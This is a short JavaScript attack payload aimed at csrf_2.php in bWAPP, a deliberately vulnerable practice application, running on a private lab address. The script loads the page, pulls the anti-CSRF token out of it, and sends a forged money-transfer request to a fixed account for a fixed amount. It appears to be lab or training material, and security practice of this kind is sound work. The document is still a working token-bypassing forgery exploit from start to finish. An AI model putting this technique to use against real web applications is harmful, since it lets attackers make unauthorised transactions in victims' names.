xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET","http://192.168.56.13/bWAPP/csrf_2.php", true);
xmlhttp.onreadystatechange=function() 
{
  if(xmlhttp.readyState==4 && xmlhttp.status == 200 )
  {
    var parser = new DOMParser();

    var responseDoc = parser.parseFromString (xmlhttp.responseText, "text/html");

    var token=responseDoc.getElementById('token').value;
    var URL="http://192.168.56.13/bWAPP/csrf_2.php?account=123-45678-90&amount=100&token=" + token + "&action=transfer"
    
    xmlhttp2=new XMLHttpRequest();
    xmlhttp2.open("GET",URL, true);
    xmlhttp2.send();

  }
}
xmlhttp.send();